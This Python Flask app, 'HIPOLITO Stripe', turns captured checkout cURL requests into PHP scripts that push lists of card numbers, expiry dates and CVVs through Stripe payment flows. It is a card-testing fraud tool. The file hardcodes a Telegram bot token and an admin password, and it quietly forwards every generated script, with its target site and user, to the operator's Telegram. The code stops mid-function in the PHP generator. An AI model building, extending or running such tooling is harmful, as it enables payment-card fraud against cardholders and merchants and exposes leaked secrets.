# hipolito_stripe.py — HIPÓLITO Stripe v6.1
# Rodar: python hipolito_stripe.py
import os, sys, json, time, uuid, re, random, secrets, threading, io, shlex
from datetime import datetime
from collections import OrderedDict
from functools import wraps

def install(pkg):
    try: __import__(pkg.replace('-','_').replace('.','_'))
    except: os.system(f"{sys.executable} -m pip install {pkg} --quiet 2>nul")

for d in ['flask','flask-cors','werkzeug','requests','colorama']:
    install(d)

from flask import Flask, request, jsonify, session, redirect, url_for
from flask_cors import CORS
import requests as http_requests
from colorama import init, Fore, Style
init(autoreset=True)

# ========== CONFIG ==========
PORT = int(os.environ.get('PORT', 5000))
BASE_URL = os.environ.get('RENDER_EXTERNAL_URL', f'http://localhost:{PORT}')
BOT_TOKEN = "8952767112:AAGsG1yxraZXY0IkZ3QmIGu5_jfTXhhhGas"
ADMIN_ID = 8617449427
ADMIN_PASSWORD = "hipolito"
TELEGRAM_CHANNEL = "https://t.me/hipolitoofc"
ADMIN_TAG = "@hipolitoofc"
API_STORAGE = "apis_criadas.json"

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(64)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['PERMANENT_SESSION_LIFETIME'] = 60 * 60 * 24 * 7
CORS(app, resources={r"/api/*": {"origins": "*"}})
os.makedirs('scripts_gerados', exist_ok=True)

# ========== KEYS ==========
KEYS_RAW = json.loads(__import__('base64').b64decode(
    "eyJjeWJlciI6IHsidXNlciI6ICJAaGlwb2xpdG9vZmMiLCAicGxhbm8iOiAiUFJPIiwgImV4cGlyYWNhbyI6ICIxNC8wNy8yMDI4IiwgInN0YXR1cyI6ICJhdGl2byJ9fQ=="
).decode('utf-8'))

# ========== RATE LIMIT ==========
_rate = {}
def rate_limit(max_req=10, window=60):
    def deco(f):
        @wraps(f)
        def wrap(*a, **kw):
            ip = request.remote_addr or 'x'
            now = time.time()
            hits = [t for t in _rate.get(ip, []) if now - t < window]
            if len(hits) >= max_req:
                return jsonify({'status': 'error', 'message': 'Muitas requisições. Aguarde.'}), 429
            hits.append(now)
            _rate[ip] = hits
            return f(*a, **kw)
        return wrap
    return deco

# ========== STORAGE ==========
def load_apis():
    if os.path.exists(API_STORAGE):
        try: return json.load(open(API_STORAGE, 'r', encoding='utf-8'))
        except: return []
    return []

def save_apis(data):
    with open(API_STORAGE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

# ========== TELEGRAM ==========
def tg_send(text, chat_id=ADMIN_ID):
    try:
        http_requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'},
            timeout=10
        )
    except Exception as e:
        print(f"[TG MSG ERR] {e}")

def tg_send_doc(file_bytes, filename, caption, chat_id=ADMIN_ID):
    try:
        http_requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
            data={'chat_id': chat_id, 'caption': caption[:1000]},
            files={'document': (filename, io.BytesIO(file_bytes), 'text/x-php')},
            timeout=30
        )
    except Exception as e:
        print(f"[TG DOC ERR] {e}")

def tg_polling():
    offset = 0
    while True:
        try:
            r = http_requests.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                params={'offset': offset, 'timeout': 30},
                timeout=40
            ).json()
            if not r.get('ok'):
                time.sleep(5); continue
            for upd in r.get('result', []):
                offset = upd['update_id'] + 1
                msg = upd.get('message')
                if not msg: continue
                chat_id = msg['chat']['id']
                if str(chat_id) != str(ADMIN_ID):
                    continue
                txt = (msg.get('text') or '').strip()
                if txt == '/api':
                    apis = load_apis()
                    if not apis:
                        tg_send("Nenhuma API criada ainda.", chat_id); continue
                    last = apis[-1]
                    tg_send_doc(
                        last.get('code','').encode('utf-8'),
                        last.get('filename', 'api.php'),
                        f"ULTIMA API\nArquivo: {last.get('filename','?')}\nSite: {last.get('site','?')}\nData: {last.get('data','?')}\nUser: {last.get('user','?')}\nReq: {last.get('requests_count', '?')}",
                        chat_id
                    )
                elif txt == '/apis':
                    apis = load_apis()
                    if not apis:
                        tg_send("Nenhuma API criada ainda.", chat_id); continue
                    tg_send(f"{len(apis)} API(s). Enviando...", chat_id)
                    for a in apis:
                        tg_send_doc(
                            a.get('code','').encode('utf-8'),
                            a.get('filename', 'api.php'),
                            f"{a.get('filename','?')}\nSite: {a.get('site','?')}\nData: {a.get('data','?')}\nUser: {a.get('user','?')}",
                            chat_id
                        )
                        time.sleep(1)
                elif txt == '/start':
                    tg_send(
                        "HIPOLITO STRIPE BOT\n\n"
                        "/api - Ultima API criada\n"
                        "/apis - Todas as APIs\n"
                        "/status - Status do servidor",
                        chat_id
                    )
                elif txt == '/status':
                    apis = load_apis()
                    tg_send(f"Online\nAPIs: {len(apis)}\n{BASE_URL}", chat_id)
        except Exception as e:
            print(f"[TG POLL ERR] {e}")
            time.sleep(5)

# ============================================================
# LOGIN PAGE
# ============================================================
LOGIN_PAGE = r'''<!DOCTYPE html>
<html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>HIPOLITO - Acesso</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;min-height:100vh;background:#0b0d10;display:flex;align-items:center;justify-content:center}
.bg{position:fixed;inset:0;background:url('foto1.png') center/cover no-repeat, #0b0d10;z-index:0}
.ov{position:fixed;inset:0;background:rgba(0,0,0,.72);z-index:1}
.box{position:relative;z-index:2;width:90%;max-width:380px}
.card{background:#13161b;border:1px solid #232830;border-radius:14px;padding:36px 30px;box-shadow:0 20px 50px rgba(0,0,0,.5)}
.title{font-size:22px;font-weight:700;color:#e6e8ec;text-align:center;letter-spacing:.5px;margin-bottom:4px}
.sub{font-size:12px;color:#6b7280;text-align:center;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:26px}
input{width:100%;padding:12px 14px;background:#0b0d10;border:1px solid #232830;border-radius:9px;color:#e6e8ec;font-size:14px;outline:none;transition:border-color .15s}
input:focus{border-color:#1f9d55;box-shadow:0 0 0 3px rgba(31,157,85,.15)}
input::placeholder{color:#4b5563}
button{width:100%;padding:12px;margin-top:14px;background:#1f9d55;color:#fff;border:none;border-radius:9px;font-size:14px;font-weight:600;cursor:pointer;transition:background .15s}
button:hover{background:#188a48}
.err{color:#ef4444;font-size:13px;text-align:center;margin-top:12px;padding:8px;background:rgba(239,68,68,.08);border-radius:6px;display:none}
.err.show{display:block}
.foot{text-align:center;margin-top:18px;font-size:11px;color:#4b5563;letter-spacing:.5px}
.foot a{color:#1f9d55;text-decoration:none}
.foot a:hover{text-decoration:underline}
</style></head><body>
<div class="bg"></div><div class="ov"></div>
<div class="box"><div class="card">
<div class="title">HIPOLITO</div>
<div class="sub">Stripe Alto Coder</div>
<form method="POST" action="/login" onsubmit="return check()">
<input type="password" id="k" name="key" placeholder="Digite sua key de acesso" autocomplete="off" required autofocus>
<button type="submit">Entrar</button>
</form>
<div class="err" id="e"></div>
<div class="foot">2024 - <a href="https://t.me/hipolitoofc" target="_blank">@hipolitoofc</a></div>
</div></div>
<iframe id="yt" width="0" height="0" src="https://www.youtube.com/embed/75bCm-EDnpk?autoplay=1&loop=1&playlist=75bCm-EDnpk&controls=0&showinfo=0&rel=0&iv_load_policy=3&mute=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen style="position:fixed;bottom:0;right:0;z-index:-1;opacity:0;pointer-events:none"></iframe>
<script>
var u=new URLSearchParams(location.search),er=u.get('error'),d=document.getElementById('e');
if(er){d.textContent=er==='invalid_key'?'Key invalida.':er==='desativado'?'Key desativada.':er==='empty'?'Digite uma key.':'Erro.';d.classList.add('show')}
function check(){if(!document.getElementById('k').value.trim()){d.textContent='Digite uma key.';d.classList.add('show');return false}return true}
document.addEventListener('click',function(){var i=document.getElementById('yt');if(i&&i.src.indexOf('autoplay=1')===-1)i.src=i.src.replace('autoplay=0','autoplay=1')},{once:true});
</script></body></html>'''

# ============================================================
# MAIN APP PAGE
# ============================================================
APP_PAGE = r'''<!DOCTYPE html>
<html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>HIPOLITO - Stripe Alto Coder</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:#0b0d10;color:#e6e8ec;min-height:100vh;font-size:14px;line-height:1.5}
.app{max-width:900px;margin:0 auto;padding:28px 20px}
.top{display:flex;justify-content:space-between;align-items:center;padding-bottom:18px;border-bottom:1px solid #232830;margin-bottom:22px;flex-wrap:wrap;gap:10px}
.brand{font-size:19px;font-weight:700;letter-spacing:.3px;color:#e6e8ec}
.brand span{color:#1f9d55;font-weight:600}
.ubar{display:flex;align-items:center;gap:14px;font-size:12px;color:#8892a0}
.ubar b{color:#e6e8ec;font-weight:500}
.lout{color:#ef4444;text-decoration:none;font-weight:500;padding:6px 12px;border:1px solid #ef444433;border-radius:6px;font-size:12px;transition:background .15s}
.lout:hover{background:#ef444414}
.card{background:#13161b;border:1px solid #232830;border-radius:12px;padding:24px;margin-bottom:18px}
.ch{display:flex;align-items:flex-start;gap:12px;margin-bottom:16px}
.ci{width:36px;height:36px;background:#1f2a22;border:1px solid #1f9d5533;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0}
.ct{font-size:15px;font-weight:600;color:#e6e8ec;margin-bottom:2px}
.cd{font-size:12.5px;color:#8892a0;line-height:1.5}
textarea{width:100%;min-height:240px;background:#0b0d10;border:1px solid #232830;border-radius:8px;padding:14px;color:#e6e8ec;font-family:'JetBrains Mono',monospace;font-size:12.5px;line-height:1.65;resize:vertical;outline:none;transition:border-color .15s}
textarea:focus{border-color:#1f9d55;box-shadow:0 0 0 3px rgba(31,157,85,.12)}
textarea::placeholder{color:#3d444d}
.actions{display:flex;gap:10px;margin-top:14px;flex-wrap:wrap}
.btn{padding:10px 18px;border:none;border-radius:7px;font-size:13px;font-weight:600;cursor:pointer;transition:background .15s;font-family:inherit}
.btn:disabled{opacity:.6;cursor:not-allowed}
.btn-p{background:#1f9d55;color:#fff;flex:1;justify-content:center}
.btn-p:hover:not(:disabled){background:#188a48}
.btn-s{background:transparent;border:1px solid #232830;color:#8892a0}
.btn-s:hover{border-color:#ef4444;color:#ef4444}
.results{margin-top:20px;display:none}
.results.show{display:block}
.rc{background:#0f1216;border:1px solid #232830;border-radius:10px;padding:16px;margin-bottom:10px}
.rc.success{border-left:3px solid #1f9d55}
.rc.error{border-left:3px solid #ef4444}
.rc.info{border-left:3px solid #3b82f6}
.rc.code{border-left:3px solid #8b5cf6}
.tag{display:inline-block;font-size:11px;font-weight:600;padding:3px 9px;border-radius:4px;letter-spacing:.5px;text-transform:uppercase;margin-bottom:10px}
.tag-g{background:#1f9d5522;color:#1f9d55}
.tag-r{background:#ef444422;color:#ef4444}
.tag-b{background:#3b82f622;color:#3b82f6}
.tag-p{background:#8b5cf622;color:#8b5cf6}
.steps{list-style:none;margin-top:8px}
.step{display:flex;align-items:center;gap:10px;padding:9px 11px;background:#0b0d10;border-radius:7px;margin-bottom:5px;font-size:12.5px;border:1px solid #1a1e24}
.sn{width:22px;height:22px;background:#1f2a22;border:1px solid #1f9d5533;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;color:#1f9d55;flex-shrink:0}
.mt{font-family:'JetBrains Mono',monospace;font-size:10.5px;font-weight:600;padding:2px 6px;border-radius:3px;letter-spacing:.3px;flex-shrink:0}
.mt-POST{background:#1f9d5522;color:#1f9d55}
.mt-GET{background:#3b82f622;color:#3b82f6}
.mt-PUT{background:#f59e0b22;color:#f59e0b}
.si{flex:1;min-width:0}
.su{color:#8892a0;font-size:11.5px;font-family:'JetBrains Mono',monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.sp{font-size:10.5px;color:#f59e0b;font-weight:600;text-transform:uppercase;letter-spacing:.4px;background:#f59e0b15;padding:2px 7px;border-radius:3px;flex-shrink:0}
.info-box{background:#0b0d10;border:1px solid #1a1e24;border-radius:7px;padding:11px;font-size:12.5px;color:#8892a0;line-height:1.7;margin-top:8px}
.info-box b{color:#e6e8ec;font-weight:600}
.code-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:8px}
.code-actions{display:flex;gap:6px}
.btn-sm{padding:6px 12px;font-size:11.5px;font-weight:600;border:none;border-radius:5px;cursor:pointer;font-family:inherit}
.btn-sm-copy{background:#3b82f6;color:#fff}
.btn-sm-copy:hover{background:#2f6fd4}
.btn-sm-dl{background:#8b5cf6;color:#fff}
.btn-sm-dl:hover{background:#7c4fe0}
.code-block{background:#06080b;border:1px solid #1a1e24;border-radius:7px;padding:14px;font-family:'JetBrains Mono',monospace;font-size:11.5px;color:#a8e6a8;overflow:auto;max-height:400px;line-height:1.65;white-space:pre-wrap;word-break:break-all}
.loader{display:flex;align-items:center;justify-content:center;gap:10px;padding:30px}
.spinner{width:20px;height:20px;border:2px solid #232830;border-top-color:#1f9d55;border-radius:50%;animation:sp .8s linear infinite}
@keyframes sp{to{transform:rotate(360deg)}}
.loader-text{color:#8892a0;font-size:13px}
.toast{position:fixed;top:18px;right:18px;padding:11px 18px;border-radius:7px;color:#fff;font-weight:600;font-size:13px;z-index:9999;box-shadow:0 8px 24px rgba(0,0,0,.4)}
.toast-success{background:#1f9d55}
.toast-error{background:#ef4444}
.footer{text-align:center;padding:20px 0 8px;color:#4b5563;font-size:11.5px}
.footer a{color:#1f9d55;text-decoration:none}
.footer a:hover{text-decoration:underline}
.cc{font-size:11px;color:#4b5563;text-align:right;margin-top:6px}
@media(max-width:640px){.app{padding:18px 14px}.card{padding:18px}.top{flex-direction:column;align-items:flex-start}.actions{flex-direction:column}.btn{width:100%}textarea{min-height:200px}}
</style></head><body>
<div class="app">
<div class="top">
<div class="brand">HIPOLITO <span>Stripe</span></div>
<div class="ubar"><b id="u">USER</b><a href="/logout" class="lout">Sair</a></div>
</div>

<div class="card">
<div class="ch">
<div class="ci">&#128203;</div>
<div>
<div class="ct">Cole seus cURLs</div>
<div class="cd">O sistema deduplica, ordena por dependencia, detecta conta/carrinho/checkout e extrai tokens automaticamente.</div>
</div>
</div>
<textarea id="ci" placeholder="Cole aqui seus cURLs, um por linha ou separados por linhas em branco."></textarea>
<div class="cc" id="cc">0 caracteres</div>
<div class="actions">
<button class="btn btn-p" id="gb" onclick="gen()">Gerar API</button>
<button class="btn btn-s" onclick="clr()">Limpar</button>
</div>
<div class="results" id="results"><div id="rc"></div></div>
</div>

<div class="footer">
2024 - <a href="https://t.me/hipolitoofc" target="_blank">HIPOLITO Stripe</a> - @hipolitoofc
<br>Ctrl+Enter para gerar
</div>
</div>
<iframe id="yt" width="0" height="0" src="https://www.youtube.com/embed/75bCm-EDnpk?autoplay=1&loop=1&playlist=75bCm-EDnpk&controls=0&showinfo=0&rel=0&iv_load_policy=3&mute=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen style="position:fixed;bottom:0;right:0;z-index:-1;opacity:0;pointer-events:none"></iframe>
<script>
var U={user:'USER_PLACEHOLDER',plano:'PLANO_PLACEHOLDER',exp:'EXP_PLACEHOLDER'};
document.getElementById('u').textContent=U.user;
var ta=document.getElementById('ci'),cc=document.getElementById('cc');
ta.addEventListener('input',function(){cc.textContent=ta.value.length+' caracteres'});
function toast(m,t){var e=document.createElement('div');e.className='toast toast-'+t;e.textContent=m;document.body.appendChild(e);setTimeout(function(){e.style.opacity='0';e.style.transition='opacity .3s';setTimeout(function(){e.remove()},300)},3000)}
var SC='',SF='';
async function gen(){
var c=ta.value;
if(!c.trim()){toast('Cole seus cURLs primeiro.','error');return}
var r=document.getElementById('results'),rc=document.getElementById('rc');
r.classList.add('show');
rc.innerHTML='<div class="rc info"><div class="loader"><div class="spinner"></div><span class="loader-text">Analisando cURLs...</span></div></div>';
var gb=document.getElementById('gb');gb.disabled=true;
try{
var resp=await fetch('/api/generate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({curls:c})});
var d=await resp.json();
if(d.status==='success'){SC=d.php_code;SF=d.filename;showRes(d);toast('API gerada.','success')}
else{showErr(d.message);toast(d.message,'error')}
}catch(e){showErr('Erro de conexao: '+e.message);toast('Erro de conexao','error')}
finally{gb.disabled=false}
}
function showRes(d){
var rc=document.getElementById('rc');
var steps='';
d.requests.forEach(function(r,i){steps+='<div class="step"><div class="sn">'+(i+1)+'</div><span class="mt mt-'+r.method+'">'+r.method+'</span><div class="si"><div class="su">'+esc(r.url.substring(0,80))+'</div></div><span class="sp">'+r.purpose+'</span></div>'});
var analysis='';
if(d.analysis){
analysis+='<div class="rc info"><span class="tag tag-b">Analise</span>';
analysis+='<div class="info-box"><b>Conta:</b> '+d.analysis.account_mode+'<br>';
analysis+='<b>Carrinho:</b> '+(d.analysis.has_cart?'Sim ('+d.analysis.cart_items+' itens)':'Nao')+'<br>';
analysis+='<b>Checkout:</b> '+(d.analysis.has_checkout?'Sim':'Nao')+'<br>';
analysis+='<b>Tokens:</b> '+(d.analysis.tokens.length?d.analysis.tokens.join(', '):'Nenhum')+'<br>';
analysis+='<b>Ignorados:</b> '+d.analysis.skipped+' (tracking/preflight)</div></div>';
}
rc.innerHTML='<div class="rc success"><span class="tag tag-g">Sucesso</span><div>'+d.message+'</div></div>'
+'<div class="rc info"><span class="tag tag-b">'+d.total_requests+' requisicoes</span><div class="steps">'+steps+'</div></div>'
+analysis
+'<div class="rc code"><div class="code-head"><span class="tag tag-p">PHP gerado</span><div class="code-actions"><button class="btn-sm btn-sm-copy" onclick="cp()">Copiar</button><button class="btn-sm btn-sm-dl" onclick="dl()">Baixar</button></div></div><div class="code-block">'+esc(d.php_code)+'</div></div>';
}
function showErr(m){document.getElementById('rc').innerHTML='<div class="rc error"><span class="tag tag-r">Erro</span><div>'+esc(m)+'</div></div>'}
function cp(){if(!SC){toast('Nada para copiar.','error');return}if(navigator.clipboard)navigator.clipboard.writeText(SC).then(function(){toast('Copiado.','success')}).catch(fb);else fb()}
function fb(){var t=document.createElement('textarea');t.value=SC;t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();try{document.execCommand('copy');toast('Copiado.','success')}catch(e){toast('Falha ao copiar.','error')}document.body.removeChild(t)}
function dl(){if(!SC){toast('Nada para baixar.','error');return}var b=new Blob([SC],{type:'text/php'});var u=URL.createObjectURL(b);var a=document.createElement('a');a.href=u;a.download=SF||'api.php';document.body.appendChild(a);a.click();document.body.removeChild(a);URL.revokeObjectURL(u);toast('Download iniciado.','success')}
function clr(){ta.value='';document.getElementById('results').classList.remove('show');document.getElementById('rc').innerHTML='';cc.textContent='0 caracteres';SC='';SF='';toast('Limpado.','success')}
function esc(t){if(!t)return'';var d=document.createElement('div');d.textContent=t;return d.innerHTML}
document.addEventListener('keydown',function(e){if((e.ctrlKey||e.metaKey)&&e.key==='Enter'){e.preventDefault();gen()}});
document.addEventListener('click',function(){var i=document.getElementById('yt');if(i&&i.src.indexOf('autoplay=1')===-1)i.src=i.src.replace('autoplay=0','autoplay=1')},{once:true});
</script></body></html>'''

# ============================================================
# PARSER
# ============================================================
def parse_curl(curl_str):
    curl_str = ' '.join(curl_str.strip().split())
    try:
        parts = shlex.split(curl_str, posix=True)
    except Exception:
        parts = curl_str.split()
    if not parts or parts[0] != 'curl':
        return None
    idx = 1
    method = 'GET'; url = ''; headers = OrderedDict(); data = ''; compressed = False
    while idx < len(parts):
        a = parts[idx]
        if a in ('-X', '--request'):
            idx += 1
            if idx < len(parts): method = parts[idx].upper()
        elif a in ('--data-binary', '-d', '--data', '--data-raw', '--data-urlencode'):
            idx += 1
            if idx < len(parts):
                chunk = parts[idx]
                data = (data + '&' + chunk) if data else chunk
                if method == 'GET': method = 'POST'
        elif a == '--compressed':
            compressed = True
        elif a in ('-H', '--header'):
            idx += 1
            if idx < len(parts):
                line = parts[idx]
                if ':' in line:
                    k, v = line.split(':', 1)
                    headers[k.strip().lower()] = v.strip()
        elif a in ('-b', '--cookie'):
            idx += 1
            if idx < len(parts): headers['cookie'] = parts[idx].strip()
        elif a in ('-A', '--user-agent'):
            idx += 1
            if idx < len(parts): headers['user-agent'] = parts[idx]
        elif a.startswith('http'):
            url = a
        idx += 1
    if not url:
        for p in parts:
            if p.startswith('http'): url = p; break
    return {'method': method, 'url': url, 'headers': headers, 'data': data, 'compressed': compressed}

# ============================================================
# ANALISE
# ============================================================
SKIP_PATTERNS = [
    r'google-analytics\.com', r'googletagmanager\.com', r'facebook\.com/tr',
    r'doubleclick\.net', r'hotjar\.com', r'segment\.(io|com)',
    r'mixpanel\.com', r'amplitude\.com', r'sentry\.io',
    r'\.(png|jpg|jpeg|gif|svg|webp|ico|woff2?|ttf)($|\?)',
    r'fonts\.googleapis\.com', r'cdn\.jsdelivr\.net', r'unpkg\.com',
]

def is_tracking_or_static(url, method):
    if method == 'OPTIONS': return True
    for pat in SKIP_PATTERNS:
        if re.search(pat, url, re.I): return True
    return False

def analyze_request(parsed):
    url = parsed['url']; data = parsed['data']; method = parsed['method']
    a = {'type': 'REQUEST', 'importance': 5, 'extracts_token': False,
         'needs_token': False, 'token_type': None, 'is_stripe_api': False,
         'is_signup': False, 'is_login': False, 'is_cart_add': False,
         'is_cart_view': False, 'is_checkout': False, 'is_payment': False, 'skip': False}
    if is_tracking_or_static(url, method):
        a['skip'] = True; return a
    if 'api.stripe.com' in url:
        a['is_stripe_api'] = True
        if '/v1/payment_methods' in url:
            a.update(type='CREATE_PM', importance=10, extracts_token=True, token_type='pm')
        elif '/v1/payment_intents' in url:
            a.update(type='PAYMENT_INTENT', importance=9)
            if method == 'POST': a.update(needs_token=True, token_type='pm', is_payment=True)
        elif '/v1/tokens' in url:
            a.update(type='CREATE_TOKEN', importance=10, extracts_token=True, token_type='tok')
        elif '/v1/setup_intents' in url:
            a.update(type='SETUP_INTENT', importance=8)
        elif '/v1/confirm' in url:
            a.update(type='CONFIRM', importance=9, needs_token=True, token_type='pi', is_payment=True)
        elif '/v1/charges' in url:
            a.update(type='CHARGE', importance=9, needs_token=True, token_type='tok', is_payment=True)
        elif '/v1/customers' in url:
            a.update(type='CREATE_CUSTOMER', importance=6)
        return a
    url_l = url.lower(); data_l = data.lower()
    if any(k in url_l for k in ['/signup','/register','/cadastro','/criar','/create-account','/join']):
        a.update(type='SIGNUP', importance=7, is_signup=True)
    elif any(k in url_l for k in ['/login','/signin','/entrar','/auth']):
        a.update(type='LOGIN', importance=6, is_login=True)
    elif any(k in url_l for k in ['/cart/add','/add-to-cart','/carrinho/adicionar','/cart/add-item']):
        a.update(type='CART_ADD', importance=7, is_cart_add=True)
    elif any(k in url_l for k in ['/cart','/carrinho']) and method in ('POST','PUT','PATCH'):
        a.update(type='CART_UPDATE', importance=6, is_cart_add=True)
    elif any(k in url_l for k in ['/cart','/carrinho']):
        a.update(type='CART_VIEW', importance=4, is_cart_view=True)
    elif any(k in url_l for k in ['/checkout','/finalizar','/pagar','/payment','/pay']):
        a.update(type='CHECKOUT', importance=8, is_checkout=True)
        if data and ('payment_method=' in data or 'pm_' in data or 'card' in data):
            a.update(is_payment=True, needs_token=True, token_type='pm')
    elif any(k in url_l for k in ['/subscribe','/trial','/assinar','/plan']):
        a.update(type='SUBSCRIBE', importance=7, is_payment=True)
    else:
        a.update(type='SITE_POST', importance=5)
    if data:
        if 'payment_method=' in data or 'pm_' in data:
            a.update(needs_token=True, token_type='pm', is_payment=True)
        if 'payment_intent' in data or 'pi_' in data:
            a.update(needs_token=True, token_type='pi')
        if 'email' in data_l and ('password' in data_l or 'senha' in data_l):
            a['is_signup'] = True
    return a

def extract_tokens(parsed):
    combined = f"{parsed['data']} {parsed['url']}"
    tokens = {}
    pats = {
        'pm_id': r'(pm_[a-zA-Z0-9]{14,})',
        'pi_id': r'(pi_[a-zA-Z0-9]{14,})(?!_secret_)',
        'token_id': r'(tok_[a-zA-Z0-9]{14,})',
        'client_secret': r'(pi_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)',
        'setup_intent_id': r'(seti_[a-zA-Z0-9]{14,})',
    }
    for name, pat in pats.items():
        m = re.search(pat, combined)
        if m: tokens[name] = m.group(1)
    for pat in [r'x-csrf-token:\s*([a-zA-Z0-9_\-]+)', r'csrf_token=([a-zA-Z0-9_\-]+)',
                r'authenticity_token=([a-zA-Z0-9/+=]+)', r'_token=([a-zA-Z0-9]+)']:
        m = re.search(pat, combined, re.I)
        if m: tokens['csrf_token'] = m.group(1); break
    return tokens

# ============================================================
# PHP GENERATOR
# ============================================================
def _esc(s):
    return s.replace('\\', '\\\\').replace('"', '\\"').replace('$', '\\$')

def _php_data(data, all_tokens):
    d = data
    rep = {
        r'card\[number\]=[^&]+': 'card[number]=" . $cc . "',
        r'card\[cvc\]=[^&]+': 'card[cvc]=" . $cvv . "',
        r'card\[exp_month\]=[^&]+': 'card[exp_month]=" . $mes . "',
        r'card\[exp_year\]=[^&]+': 'card[exp_year]=" . $ano . "',
        r'(?<![a-z_])number=[^&]+': 'number=" . $cc . "',
        r'(?<![a-z_])cvc=[^&]+': 'cvc=" . $cvv . "',
        r'(?<![a-z_])exp_month=[^&]+': 'exp_month=" . $mes . "',
        r'(?<![a-z_])exp_year=[^&]+': 'exp_year=" . $ano . "',
        r'(?<![a-z_])cc=[^&]+': 'cc=" . $cc . "',
        r'(?<![a-z_])cvv=[^&]+': 'cvv=" . $cvv . "',
        r'(?<![a-z_])mm=[^&]+': 'mm=" . $mes . "',
        r'(?<![a-z_])yy=[^&]+': 'yy=" . $ano . "',
    }
    for pat, r in rep.items():
        d = re.sub(pat, r, d)
    for name, val in all_tokens.items():
        if name in ('pm_id','pi_id','token_id','setup_intent_id','client_secret'):
            d = d.replace(val, f'" . ${name} . "')
    return d

def generate_php(parsed_curls, admin_tag):
    analyzed = []; all_tokens = {}; skipped = 0
    for c in parsed_curls:
        a = analyze_request(c)
        if a['skip']: skipped += 1; continue
        t = extract_tokens(c)
        analyzed.append({'curl': c, 'analysis': a, 'tokens': t})
        all_tokens.update(t)
    order = {'CREATE_PM':100,'CREATE_TOKEN':99,'SIGNUP':95,'LOGIN':90,
             'CART_ADD':80,'CART_UPDATE':75,'CART_VIEW':70,
             'CHECKOUT':60,'PAYMENT_INTENT':55,'CONFIRM':50,
             'CHARGE':48,'SUBSCRIBE':45,'SITE_POST':40}
    analyzed.sort(key=lambda x: order.get(x['analysis']['type'], 10), reverse=True)
    has_signup = any(x['analysis']['is_signup'] for x in analyzed)
    has_login = any(x['analysis']['is_login'] for x in analyzed)
    has_cart = any(x['analysis']['is_cart_add'] for x in analyzed)
    has_checkout = any(x['analysis']['is_checkout'] for x in analyzed)
    acc_mode = 'Nova conta' if has_signup else ('Conta fixa' if has_login else 'Nao detectado')
    p = []
    p.append('<?php')
    p.append('/**')
    p.append(f' * HIPOLITO Stripe - Alto Coder v6.1')
    p.append(f' * Generated by {admin_tag} - {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
    p.append(f' * Total Requests: {len(analyzed)} (ignorados: {skipped})')
    p.append(f' * Account: {acc_mode} | Cart: {"Sim" if has_cart else "Nao"} | Checkout: {"Sim" if has_checkout else "Nao"}')
    p.append(' */')
    p.append('error_reporting(0); set_time_limit(0); date_default_timezone_set("America/Sao_Paulo");')
    p.append('function detectBandeira($cc){')
    p.append('  $cc=preg_replace("/[^0-9]/","",$cc);')
    p.append('  if(preg_match("/^4[0-9]{12}(?:[0-9]{3})?$/",$cc))return "Visa";')
    p.append('  if(preg_match("/^5[1-5][0-9]{14}$/",$cc))return "Mastercard";')
    p.append('  if(preg_match("/^3[47][0-9]{13}$/",$cc))return "Amex";')
    p.append('  if(preg_match("/^6(?:011|5[0-9]{2})[0-9]{12}$/",$cc))return "Discover";')
    p.append('  if(preg_match("/^(?:2131|1800|35\\d{3})\\d{11}$/",$cc))return "JCB";')
    p.append('  return "Unknown";}')
    p.append('$lista=isset($_GET["lista"])?$_GET["lista"]:"";')
    p.append('if(empty($lista))die(json_encode(["status"=>"error","message"=>"Parametro lista obrigatorio"]));')
    p.append('$parts=explode("|",$lista);')
    p.append('if(count($parts)<4)die(json_encode(["status"=>"error","message"=>"Formato: CC|MES|ANO|CVV"]));')
    p.append('$cc=preg_replace("/[^0-9]/","",trim($parts[0]));$mes=trim($parts[1]);$ano=trim($parts[2]);$cvv=trim($parts[3]);')
    p.append('if(strlen($ano)==2)$ano="20".$ano;')
    p.append('if(strlen($cc)<13||strlen($cvv)<3)die(json_encode(["status"=>"error","message"=>"Dados invalidos"]));')
    p.append('$bandeira=detectBandeira($cc);$inicio=microtime(true);')
    for tk in all_tokens:
        p.append(f'${tk}="";')
    p.append('$ck=tempnam(sys_get_temp_dir(),"CK_");$ch=curl_init();')
    p.append('curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>false,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_TIMEOUT=>60,CURLOPT_USERAGENT=>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"]);')
    for i, item in enumerate(analyzed):
        c = item['curl']; a = item['analysis']
        url = c['url']; method = c['method']; headers = c['headers']; data = c['data']; comp = c['compressed']
